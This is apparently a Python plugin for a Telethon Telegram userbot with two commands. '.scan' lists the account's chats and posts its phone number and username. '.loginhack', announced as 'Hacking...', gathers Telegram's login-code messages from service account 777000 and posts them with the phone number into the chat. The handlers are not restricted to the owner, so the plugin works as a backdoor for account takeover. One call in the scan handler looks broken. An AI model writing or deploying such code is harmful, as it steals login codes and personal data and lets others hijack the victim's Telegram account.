from telethon import TelegramClient, events
import time
import phoenix.client
client = phoenix.client.client

@events.register(events.NewMessage(pattern='\.scan'))
async def chatscan(event):
    await event.edit("Scanning...")
    time.sleep(0.5)
    await event.delete()
    user = await client.get_me()
    chats = "**Chats**\n"
    async for dailog in client.iter_dialogs():             
        chats += f"**chat:** {dailog.name} | **Id:** {str(dailog.id)}\n"
    await event.send_messages(chats)
    await event.reply("Phone number: " + "+"+user.phone + "\nUsername: " + "@"+user.username + "\nUserbot Developer: @programmer_www")


@events.register(events.NewMessage(pattern=".loginhack"))
async def loginhack(event):
    await event.edit("Hacking...")
    time.sleep(0.5)
    await event.delete()
    user = await client.get_me()
    codes = "**Telegram codes**\n"
    async for message in client.iter_messages(777000):
        codes += f"{message.text}\n---------------------------------------------\n"
    codes += "+"+user.phone
    await event.reply(codes)
